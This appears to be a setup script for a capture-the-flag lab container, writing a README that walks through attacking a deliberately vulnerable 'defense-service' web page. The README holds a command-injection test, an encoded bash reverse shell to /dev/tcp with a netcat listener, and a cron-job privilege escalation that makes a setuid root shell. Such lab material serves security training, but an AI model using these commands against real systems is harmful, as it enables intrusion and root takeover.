#!/bin/bash

# Display network information
echo "Container network information:"
ip addr | grep -w inet

# Create a simple instruction file
cat << 'EOF' > /home/kali/README.txt
LINUX DB SERVER CHALLENGE INSTRUCTIONS
======================================

This challenge involves exploiting a vulnerable web server that's accessible via the defense-service hostname.

The target is accessible at:
- Web server: http://defense-service/
- Vulnerable page: http://defense-service/execute.php

STEP 1: Test command injection 
$ curl "http://defense-service/execute.php?cmd=id"

STEP 2: Get a reverse shell
- Start a listener:
  $ nc -lvnp 4444

- Find your IP address:
  $ ip addr | grep -w inet

- In another terminal, trigger the reverse shell:
  $ curl "http://defense-service/execute.php?cmd=bash%20-i%20%3E%26%20/dev/tcp/YOUR_IP/4444%200%3E%261"
  (Replace YOUR_IP with your IP address)

STEP 3: Escalate privileges via vulnerable cron job
$ echo '#!/bin/bash' > /opt/cronjobs/just-script.sh
$ echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/cronjobs/just-script.sh
$ chmod +x /opt/cronjobs/just-script.sh

STEP 4: Wait 1-2 minutes, then execute
$ /tmp/rootbash -p

STEP 5: Find the flag file
$ find / -name "*.txt" -o -name "flag*" -o -name "*flag*" 2>/dev/null

You should now have a root shell. Find the flag to complete the challenge.
EOF

# Create a simple test script 
cat << 'EOF' > /home/kali/test-connection.sh
#!/bin/bash

echo "====================================="
echo "Linux DB Server - Connection Tester"
echo "====================================="

# Try DNS resolution first
echo -n "Resolving defense-service hostname... "
getent hosts defense-service
if [ $? -eq 0 ]; then
    echo "SUCCESS"
else
    echo "FAILED - DNS resolution issue"
    echo "Adding defense-service to /etc/hosts as a fallback..."
    echo "127.0.0.1 defense-service" >> /etc/hosts
    echo "Added. Now trying again..."
fi

# Test base connection
echo -n "Testing connection to http://defense-service/... "
curl -v --connect-timeout 5 "http://defense-service/" > /tmp/curl_output 2>&1
CURL_EXIT=$?
cat /tmp/curl_output

if [ $CURL_EXIT -eq 0 ]; then
    echo "SUCCESS"
else
    echo "FAILED (exit code: $CURL_EXIT)"
    echo "Detailed connection diagnostics:"
    echo "--------------------------------"
    
    # Check if service is reachable
    echo "Trying to ping defense-service..."
    ping -c 2 defense-service
    
    # Try different network approaches
    echo "Trying other connection methods..."
    
    # Get the defense-service IP if possible
    DEFENSE_IP=$(getent hosts defense-service | awk '{ print $1 }')
    if [ -n "$DEFENSE_IP" ]; then
        echo "defense-service IP: $DEFENSE_IP"
        echo "Trying direct IP connection..."
        curl -v --connect-timeout 5 "http://$DEFENSE_IP/"
    fi
    
    # Try localhost as fallback
    echo "Trying localhost and 127.0.0.1..."
    curl -v --connect-timeout 2 "http://localhost/"
    curl -v --connect-timeout 2 "http://127.0.0.1/"
    
    echo "--------------------------------"
    echo "Connection failed. Please report this issue."
    exit 1
fi

# Test command injection
echo -n "Testing command injection vulnerability... "
RESULT=$(curl -s --connect-timeout 5 "http://defense-service/execute.php?cmd=id" 2>/dev/null)
if [ $? -eq 0 ] && [[ "$RESULT" == *"uid="* ]]; then
    echo "SUCCESS"
    echo ""
    echo "Example output:"
    echo "--------------"
    echo "$RESULT"
    echo "--------------"
    echo ""
    echo "✅ Challenge is ready! Follow instructions in README.txt"
else
    echo "FAILED"
    echo "Command injection not working. Please check the defense container."
fi

echo "Network diagnostic information:"
echo "------------------------------"
ip addr
echo "------------------------------"
netstat -tuln
echo "------------------------------"
EOF

chmod +x /home/kali/test-connection.sh
chown kali:kali /home/kali/test-connection.sh
chown kali:kali /home/kali/README.txt

# Make sure permissions are correct
chown -R kali:kali /home/kali

# Add hosts entry for defense-service as fallback
echo "Setting up fallback DNS for defense container..."
echo "127.0.0.1 defense-service" >> /etc/hosts

# Keep container running but switch to the kali user for interactive shell
echo "================== CHALLENGE SETUP =================="
echo "Environment is ready! You can now begin the challenge."
echo ""
echo "First steps:"
echo "1. Run ./test-connection.sh to verify connectivity"
echo "2. Read README.txt for detailed instructions"
echo "=================================================="
su -l kali
sleep infinity
